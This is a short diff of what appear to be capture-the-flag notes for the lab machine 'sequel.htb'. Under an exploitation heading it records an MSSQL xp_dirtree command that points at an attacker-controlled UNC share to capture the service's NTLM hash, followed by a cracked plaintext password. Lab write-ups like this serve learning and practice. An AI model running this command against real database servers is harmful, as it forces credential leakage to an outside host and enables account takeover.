@@ -77,7 +77,7 @@ domain: sequel.htb
 
 ## exploitation
 ```
-exec master.dbo.xp_dirtree '\\10.10.16.14\test'
+exec master.dbo.xp_dirtree '\\10.10.16.14\test' (worked)
 
 password:REGGIE1234ronnie
 
